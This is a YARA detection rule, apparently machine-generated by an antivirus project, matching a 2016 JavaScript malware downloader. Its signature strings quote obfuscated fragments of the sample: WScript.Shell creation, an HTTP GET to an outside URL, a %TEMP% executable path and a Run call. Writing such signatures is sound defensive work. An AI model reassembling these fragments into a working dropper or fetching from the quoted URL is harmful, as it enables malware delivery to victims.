rule sig_20160328_f761895143500b738c158be3f9a126d0 {
  meta:
    description = "datamaliciousorder - file 20160328_f761895143500b738c158be3f9a126d0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "46e5159e126d63130c7c7b69b3c733697d661d86f13502f3609ec9d1fe3b614c"

  strings:
    $s1  = "function Esmfv() {return Oagkqixgr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"KwGLjjCjiUA.exe\";};" fullword ascii
    $s2  = "Dqopoftqk[Vslpczvl](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Ykimlqkz](Ysujeuaczm() * 11)} while (Dqopoftqk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Oagkqixgr = function Tylcwkkike() {return WScript[Dkrwmwkfs](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nybvllv(Szndla, Apypgvwnrv){return Szndla - Apypgvwnrv;};" fullword ascii
    $s6  = "function Owfgopvmd(Rdvdavlgwb){Oagkqixgr[\"Run\"](Rdvdavlgwb, Meirokb, Meirokb);};" fullword ascii
    $s7  = "function Gswzcxn() {return ((Vvclar == true) && (Vvclar == Eczufvljny)) ? 1 : Meirokb;};" fullword ascii
    $s8  = "function Qtrteiwywu(){return Dkrwmwkfs;};" fullword ascii
    $s9  = "return Nybvllv(Teptvb, Hbnqb);" fullword ascii
    $s10 = "var Gkgsvb = new this[\"Date\"]();" fullword ascii
    $s11 = "var Knwso = false;" fullword ascii
    $s12 = "function Ysujeuaczm(){return 22;};" fullword ascii
    $s13 = "Vvclar = true; " fullword ascii
    $s14 = "function Xvvnbnzq()" fullword ascii
    $s15 = " while (Tspztsyxpq){" fullword ascii
    $s16 = "function Pytzyrjjt(Fsnmalpjj) {var Uehnef = (1, 2, 3, 4, 5, Fsnmalpjj); return Uehnef;};" fullword ascii
    $s17 = "var Vvclar = false;" fullword ascii
    $s18 = "function Obyuvrw(){return Uxcbdvqj;};" fullword ascii
    $s19 = "Eczufvljny = true; " fullword ascii
    $s20 = "var Eczufvljny = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}